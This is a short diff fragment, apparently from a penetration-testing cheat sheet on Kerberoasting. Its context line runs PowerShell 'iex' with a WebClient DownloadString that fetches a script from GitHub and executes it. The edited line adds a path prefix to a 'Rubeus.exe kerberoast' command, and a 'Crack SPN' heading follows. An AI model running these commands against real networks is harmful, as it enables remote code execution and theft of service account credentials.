@@ -510,7 +510,7 @@ iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com
 
 #### Rubeus
 
-```Rubeus.exe kerberoast```
+```.\Rubeus.exe kerberoast```
 
 #### Crack SPN
 
